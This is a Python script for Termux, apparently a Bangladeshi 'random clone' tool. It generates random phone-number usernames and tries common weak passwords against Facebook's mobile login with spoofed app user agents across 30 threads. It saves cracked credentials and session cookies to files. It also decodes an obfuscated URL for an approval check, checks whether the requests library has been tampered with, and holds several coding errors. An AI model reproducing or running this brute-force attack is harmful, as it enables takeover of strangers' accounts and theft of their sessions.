import base64
import os
import random
import sys
import time
import uuid
import requests
import bs4
import mechanize
import httpx
import rich
import json
import subprocess
import random
import string
from concurrent.futures import ThreadPoolExecutor as mr_tarek_143

if ModuleNotFoundError:
    print('\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] MODULE INSTALLING ')
    os.system('pip install requests rich')
    os.system('pip install mechanize')
    os.system('pip install bs4 httpx')
os.system('rm -rf /sdcard/.txt')
os.system('clear')
open('/sdcard/.txt', 'w').write(' ')
if PermissionError:
    print(f'''{G1}[{A}×{G1}]{G1} THIS TOOL NOT ALLOW WITHOUT STORAGE PERMISSION''')
    os.system('termux-setup-storage')
    os.system('clear')
    tarek(f'''{G1}[{A}={G1}]{G1} PLEASE RUN AGAIN THIS TOOL !!''')
(loop, ok, cp, user) = (0, [], [], [])
cok = []
plist = []
A = '\x1b[1;97m'
R = '\x1b[38;5;196m'
Y = '\x1b[1;33m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\x1b[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'

def linex():
    print(f'''{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')


def clear():
    os.system('clear')
    print(logo)

print(f'''{G}PLEASE WAIT 1 MINUTES CHECKING YOUR APPROVAL''')
time.sleep(60)

def sex():
    facebook_version = f'''{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}'''
    fbbv = str(random.randint(10000000, 66666666))
    fbrv = str(random.randint(0, 999999999))
    density = random.choice(['2.0', '2.5', '3.0'])
    width = random.choice(['720', '1080', '1280'])
    height = random.choice(['720', '1080', '1280', '1440', '1920'])
    ua = f'''[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/MTN-CG;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_X01BDA;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:]'''
    return ua

tarek = '=RADOWAN='
tarek1 = 'KEY'
idmy = uuid.uuid4().hex[:10].upper()
key = tarek + idmy + tarek1

logo = f'''
{A}
██████╗░░█████╗░██████╗░  ░░███╗░░
██╔══██╗██╔══██╗██╔══██╗  ░████║░░
██████╔╝███████║██║░░██║  ██╔██║░░
██╔══██╗██╔══██║██║░░██║  ╚═╝██║░░
██║░░██║██║░░██║██████╔╝  ███████╗
╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░  ╚══════╝ 
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G1}[{A}={G1}]{G1} DEVELOPER {A}●{G1} RADOWAN
{G1}[{A}={G1}]{G1} TOOLTYPE  {A}●{G1} RANDOM CLONE
{G1}[{A}={G1}]{G1} STATUS    {A}●{G2} TRIAL
{G1}[{A}={G1}]{G1} VERSION   {A}● V{G1}/{A}1.2
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
'''

def main():
    clear()
    print(f'''{G1}[{A}2{G1}]{G1} RANDOM CLONE ''')
    print(f'''{G1}[{A}3{G1}]{G1} CONTACT OWNER ''')
    print(f'''{G1}[{A}0{G1}]{G1} EXIT TOOL ''')
    linex()
    sex = input(f'''{G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ''')
    if sex in ('1',):
        XXX()
        return None
    if sex in ('2',):
        os.system('xdg-open https://www.facebook.com/profile.php?id=100009661010247')
        main()
        return None
    if sex in ('0',):
        sys.exit()
        return None
    main()

import rich

os.system('pip install rich')
import rich
from rich.panel import Panel
from datetime import datetime
url = base64.b64decode(b'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01SLVRBUkVLLTE0My9NUi1UQVJFSy1BUEktRklMRS9tYWluL0dSRUVOLnR4dA==')
real_url = url.decode('ASCII')
all_datA = []

def req(mr_tarek, real_url):
    lx = mr_tarek.get(real_url)
    approved = lx.text
    return approved
    print(f'''{G1} PLEASE CHECK YOUR INTERNET CONNECTION''')
    sys.exit()


def sefty():
    h = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py', 'r').read()
    vx = re.search('print', h)
    if vx == None:
        report = 'pure_user'
    report = 'bypass_user'
    return report


def sefty1():
    h = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py', 'r').read()
    vx = re.search('print', h)
    if vx == None:
        report = 'pure_user'
    report = 'bypass_user'
    return report


def sefty2():
    h = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/utils.py', 'r').read()
    vx = re.search('print', h)
    if vx == None:
        report = 'pure_user'
    report = 'bypass_user'
    return report


def sefty3():
    h = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/auth.py', 'r').read()
    vx = re.search('print', h)
    if vx == None:
        report = 'pure_user'
    report = 'bypass_user'
    return report

if 'pure_user' == sefty():
    pass
if 'bypass_user' == sefty():
    print('{G3}BRO FUCK YOUR SYSTEM 😈😎😎...')
    time.sleep(2)
    sys.exit()
if 'pure_user' == sefty1():
    pass
if 'bypass_user' == sefty1():
    print('{G3}BRO FUCK YOUR SYSTEM 😈😎😎...')
    time.sleep(2)
    sys.exit()
if 'pure_user' == sefty2():
    pass
if 'bypass_user' == sefty2():
    print(f'''{G3}BRO FUCK YOUR SYSTEM 😈😎😎...''')
    time.sleep(2)
    sys.exit()
if 'pure_user' == sefty3():
    pass
if 'bypass_user' == sefty3():
    print(f'''{G3}BRO FUCK YOUR SYSTEM 😈😎😎...''')
    time.sleep(2)
    sys.exit()

clear()

def XXX():
    user = []
    os.system('clear')
    print(logo)
    print(f'''{G1}[{A}={G1}]{G1} EXAMPLE :{G1}019, {G1}017, {G1}018, {G1}016{A} (BD CODES)''')
    code = input(f'''{G1}[{A}?{G1}]{G1} YOUR SIM CODE {A}➢ {G1}''')
    os.system('clear')
    print(logo)
    name = input(f'''{G1}[{A}?{G1}]{G1} TYPE YOUR NAME {A}➢ {G1}''')
    os.system('clear')
    print(logo)
    limit = int(input(f'''{G1}[{A}?{G1}]{G1} EXAMPLE : 2000, 5000, 10000, 50000{A} (LIMIT) '''))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with mr_tarek_143(max_workers=30) as Tua:
        clear()
        total = str(len(user))
        print(f'''{G1}[{A}={G1}]{G1} TOTAL ID{A} :{G1} {total}''')
        print(f'''{G1}[{A}={G1}]{G1} YOUR SIM CODE{A} :{G1} {code}''')
        print(f'''{G1}[{A}={G1}]{G1} AIRPLANE ON/OFF EVERY {A}5 {G1}MIN ''')
        print(f'''{G1}[{A}={G1}]{G1} PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED ''')
        linex()
        for love in user:
            uid = code + love
            pwx = [love, code + love, 'Bangladesh', 'free fire', 'i love you']
            Tua.submit(free, uid, pwx, total)
    print(f'''{G1}[{A}={G1}]{G1} YOUR CLONING HAS BEEN COMPLETED ''')
    print(f'''{G1}[{A}={G1}]{G1} NOTE : OK IDS SAVE TO /SDCARD/RADOWAN-OK.txt ''')
    print(f'''{G1}[{A}={G1}]{G1} NOTE : CP IDS SAVE TO /SDCARD/RADOWAN-CP.txt ''')
    input(f'''{A}PRESS ENTER TO BACK MENU ''')


def free(uid, pwx, total):
    try:
        global loop
        global ok
        global cp
        global cok
        global user
        headers1 = {
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://m.facebook.com',
            'referer': 'https://m.facebook.com',
            'user-agent': sex()
        }
        ses = requests.Session()
        sys.stdout.write(f'\r{G1}[{A}RADOWAN{G1}] {G1}{loop}{A}/{G1}{total}  {G1}OK-:{G1}{len(ok)}  {A}CP-:{G1}{len(cp)} '),
        sys.stdout.flush()
        for pw in pwx:
            try:
                ses.headers.update(headers1)
                p = ses.get('https://m.facebook.com')
                dataa = {
                    'lsd': re.search('name="lsd" value="(.*?)"', p.text).group(1),
                    'jazoest': re.search('name="jazoest" value="(.*?)"', p.text).group(1),
                    'm_ts': re.search('name="m_ts" value="(.*?)"', p.text).group(1),
                    'li': re.search('name="li" value="(.*?)"', p.text).group(1),
                    'try_number': '0',
                    'unrecognized_tries': '0',
                    'email': uid,
                    'pass': pw,
                    'login': 'Log In'
                }
                koki = (";").join([f'{key}={value}' for key, value in ses.cookies.get_dict().items()])
                koki1 = {
                    'cookie': koki
                }
                po = ses.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8', data=dataa, headers=headers1)
                if "c_user" in ses.cookies.get_dict().keys():
                    coki = (";").join([f'{key}={value}' for key, value in ses.cookies.get_dict().items()])
                    cid = coki[151:166]
                    print(f'\r{G1}[{A}RADOWAN-OK{G1}]{A} {uid}{G1} | {A}{pw} {G1}| {A}{coki} ')
                    open('/sdcard/RADOWAN-OK.txt', 'a').write(uid + '|' + pw + '|' + cid + '|' + coki + '\n')
                    ok.append(cid)
                    break
                elif 'checkpoint' in ses.cookies.get_dict().keys():
                    cid = koki1[141:156]
                    print(f'\r{G1}[{A}RADOWAN-CP{G1}]{A} {uid}{G1} | {A}{pw}')
                    open('/sdcard/RADOWAN-CP.txt', 'a').write(uid + '|' + pw + '|' + cid + '|' + '\n')
                    cp.append(cid)
                    break
                else:
                    continue
            except requests.exceptions.ConnectionError:
                time.sleep(31)
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(31)


main() 